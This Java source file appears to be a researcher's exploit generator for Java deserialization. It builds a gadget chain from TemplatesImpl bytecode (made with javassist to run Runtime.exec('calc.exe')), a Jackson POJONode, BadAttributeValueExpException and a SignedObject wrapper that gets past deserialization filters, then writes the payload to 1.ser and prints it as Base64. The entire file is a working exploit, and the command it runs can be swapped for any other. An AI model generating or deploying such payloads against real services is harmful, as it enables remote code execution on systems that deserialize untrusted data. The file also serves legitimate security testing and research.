package org.y4sec.gadget;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtMethod;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.Base64;
import java.util.List;

public class JacksonSignPayload {
    public static void main(String[] args) throws Exception {
        List<Object> list = new ArrayList<>();

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{}, ctClass);

        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "y4sec");
        setFieldValue(templatesImpl, "_tfactory", null);

        ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
        ctClass.removeMethod(writeReplace);
        ctClass.toClass();

        POJONode jsonNodes = new POJONode(templatesImpl);

        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp, jsonNodes);

        list.add(exp);

        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject = new SignedObject((Serializable) list, kp.getPrivate(),
                Signature.getInstance("DSA"));

        POJONode jsonNodes1 = new POJONode(signedObject);

        BadAttributeValueExpException exp1 = new BadAttributeValueExpException(null);
        val.set(exp1, jsonNodes1);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp1);
        FileOutputStream fout = new FileOutputStream("1.ser");
        fout.write(barr.toByteArray());
        fout.close();

        System.out.println(serial(exp1));
    }

    public static String serial(Object o) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(o);
        oos.close();
        return Base64.getEncoder().encodeToString(baos.toByteArray());

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs) {
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }

    private static void setFieldValue(Object obj, String field, Object arg) throws Exception {
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
